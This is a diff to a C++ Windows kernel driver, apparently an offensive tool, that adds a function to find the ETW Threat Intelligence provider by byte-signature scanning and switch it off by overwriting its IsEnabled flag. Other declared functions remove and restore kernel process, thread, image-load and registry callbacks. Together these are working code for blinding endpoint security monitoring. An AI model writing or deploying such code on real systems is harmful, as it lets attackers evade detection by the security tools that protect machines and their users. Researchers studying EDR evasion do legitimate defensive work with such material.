@@ -1,6 +1,8 @@
 #pragma once
 #include "pch.h"
 
+constexpr UCHAR EtwThreatIntProvRegHandleSignature1[] = {0x60, 0x4C, 0x8B, 0xCC};
+constexpr UCHAR EtwThreatIntProvRegHandleSignature2[] = {0xD2, 0x48, 0x8B, 0xCC};
 constexpr UCHAR PspCreateProcessNotifyRoutineSignature[] = { 0x4C, 0x8D, 0xCC };
 constexpr UCHAR PspCreateThreadNotifyRoutineSignature[] = { 0x48, 0x8D, 0xCC };
 constexpr UCHAR PspLoadImageNotifyRoutineSignature[] = { 0x48, 0x8D, 0xCC };
@@ -9,6 +11,8 @@ constexpr UCHAR CmpCallbackListLockSignature[] = { 0x48, 0x8D, 0xCC };
 constexpr UCHAR CmpInsertCallbackInListByAltitudeSignature[] = { 0x8B, 0xCB, 0xE8, 0xCC };
 constexpr UCHAR CallFunctionSignature[] = { 0xE8, 0xCC };
 constexpr UCHAR RoutinesListCountSignature[] = { 0xF0, 0xFF, 0x05, 0xCC };
+constexpr SIZE_T EtwThreatIntProvRegHandleDistance = 0x29D;
+constexpr SIZE_T EtwGuidEntryOffset = 0x20;
 constexpr SIZE_T CallbackListHeadSignatureDistance = 0xC4;
 constexpr SIZE_T CmpCallbackListLockSignatureDistance = 0x4A;
 constexpr SIZE_T CmpInsertCallbackInListByAltitudeSignatureDistance = 0x108;
@@ -19,6 +23,7 @@ constexpr SIZE_T PsSetLoadImageNotifyRoutineExDistance = 0xF;
 constexpr SIZE_T PspCreateProcessNotifyRoutineDistance = 0xC3;
 constexpr SIZE_T PspCreateThreadNotifyRoutineDistance = 0x9B;
 constexpr SIZE_T PspLoadImageNotifyRoutineDistance = 0x10B;
+constexpr SIZE_T EtwThreatIntProvRegHandleOffset = 8;
 constexpr SIZE_T CallFunctionOffset = 5;
 constexpr SIZE_T CmpInsertCallbackInListByAltitudeOffset = 7;
 constexpr SIZE_T CmpCallbackListLockOffset = 7;
@@ -26,6 +31,7 @@ constexpr SIZE_T CallbacksListCountOffset = 3;
 constexpr SIZE_T RoutinesListOffset = 7;
 constexpr SIZE_T PsNotifyRoutinesRoutineCountOffset = 0xB;
 
+NTSTATUS EnableDisableEtwTI(bool enable);
 NTSTATUS RestoreCallback(KernelCallback* Callback);
 NTSTATUS RemoveCallback(KernelCallback* Callback);
 NTSTATUS ListObCallbacks(ObCallbacksList* Callbacks);
@@ -44,13 +50,85 @@ NTSTATUS RemoveDisabledCallback(KernelCallback* Callback, DisabledKernelCallback
 
 /*
 * Description:
+* EnableDisableEtwTI is responsible to enable or disable ETWTI.
+*
+* Parameters:
+* @enable	[bool]	   -- Whether to enable or disable ETWTI.
+*
+* Returns:
+* @status	[NTSTATUS] -- Whether successfuly enabled or disabled.
+*/
+NTSTATUS EnableDisableEtwTI(bool enable) {
+	NTSTATUS status = STATUS_SUCCESS;
+	EX_PUSH_LOCK etwThreatIntLock = NULL;
+	ULONG foundIndex = 0;
+	SIZE_T bytesWritten = 0;
+	SIZE_T etwThreatIntProvRegHandleSigLen = sizeof(EtwThreatIntProvRegHandleSignature1);
+	UCHAR* etwThreatIntProvRegHandleSig = (UCHAR*)ExAllocatePoolWithTag(PagedPool, etwThreatIntProvRegHandleSigLen, DRIVER_TAG);
+
+	if (!etwThreatIntProvRegHandleSig)
+		return STATUS_INSUFFICIENT_RESOURCES;
+	RtlCopyMemory(etwThreatIntProvRegHandleSig, EtwThreatIntProvRegHandleSignature1, etwThreatIntProvRegHandleSigLen);
+
+	AutoLock lock(aaGlobals.Lock);
+	PVOID searchedRoutineAddress = (PVOID)KeInsertQueueApc;
+	SIZE_T targetFunctionDistance = EtwThreatIntProvRegHandleDistance;
+	PLONG searchedRoutineOffset = (PLONG)FindPattern((PCUCHAR)etwThreatIntProvRegHandleSig, 0xCC, etwThreatIntProvRegHandleSigLen - 1, searchedRoutineAddress, targetFunctionDistance, &foundIndex, etwThreatIntProvRegHandleSigLen);
+
+	if (!searchedRoutineOffset) {
+		RtlCopyMemory(etwThreatIntProvRegHandleSig, EtwThreatIntProvRegHandleSignature2, etwThreatIntProvRegHandleSigLen);
+		searchedRoutineOffset = (PLONG)FindPattern((PCUCHAR)etwThreatIntProvRegHandleSig, 0xCC, etwThreatIntProvRegHandleSigLen - 1, searchedRoutineAddress, targetFunctionDistance, &foundIndex, etwThreatIntProvRegHandleSigLen);
+
+		if (!searchedRoutineOffset) {
+			status = STATUS_NOT_FOUND;
+			goto Cleanup;
+		}
+	}
+	PUCHAR etwThreatIntProvRegHandle = (PUCHAR)searchedRoutineAddress + (*searchedRoutineOffset) + foundIndex + EtwThreatIntProvRegHandleOffset;
+	ULONG enableProviderInfoOffset = GetEtwProviderEnableInfoOffset();
+
+	if (enableProviderInfoOffset == (ULONG)STATUS_UNSUCCESSFUL) {
+		status = STATUS_UNSUCCESSFUL;
+		goto Cleanup;
+	}
+	PTRACE_ENABLE_INFO enableProviderInfo = (PTRACE_ENABLE_INFO)(etwThreatIntProvRegHandle + EtwGuidEntryOffset + enableProviderInfoOffset);
+	ULONG lockOffset = GetEtwGuidLockOffset();
+
+	if (lockOffset != (ULONG)STATUS_UNSUCCESSFUL) {
+		etwThreatIntLock = (EX_PUSH_LOCK)(etwThreatIntProvRegHandle + EtwGuidEntryOffset + lockOffset);
+		ExAcquirePushLockExclusiveEx(&etwThreatIntLock, 0);
+	}
+
+	if (enable) {
+		status = KeWriteProcessMemory(&aaGlobals.PrevEtwTiValue, PsGetCurrentProcess(), &enableProviderInfo->IsEnabled, sizeof(ULONG), KernelMode);
+		aaGlobals.PrevEtwTiValue = 0;
+	}
+	else {
+		ULONG disableEtw = 0;
+		status = KeReadProcessMemory(PsGetCurrentProcess(), &enableProviderInfo->IsEnabled, &aaGlobals.PrevEtwTiValue, sizeof(ULONG), KernelMode);
+
+		if (NT_SUCCESS(status))
+			status = MmCopyVirtualMemory(PsGetCurrentProcess(), &disableEtw, PsGetCurrentProcess(), &enableProviderInfo->IsEnabled, sizeof(ULONG), KernelMode, &bytesWritten);
+	}
+
+	if (etwThreatIntLock)
+		ExReleasePushLockExclusiveEx(&etwThreatIntLock, 0);
+
+Cleanup:
+	if (etwThreatIntProvRegHandleSig)
+		ExFreePoolWithTag(etwThreatIntProvRegHandleSig, DRIVER_TAG);
+	return status;
+}
+
+/*
+* Description:
 * RestoreObCallback is responsible to restoring a certain callback from the callback list.
 *
 * Parameters:
 * @Callback [KernelCallback*] -- Callback to remove.
 *
 * Returns:
-* @status	[NTSTATUS]		  -- Whether successfuly removed or not.
+* @status	[NTSTATUS]		  -- Whether successfuly restored or not.
 */
 NTSTATUS RestoreCallback(KernelCallback* Callback) {
 	DisabledKernelCallback callback{};
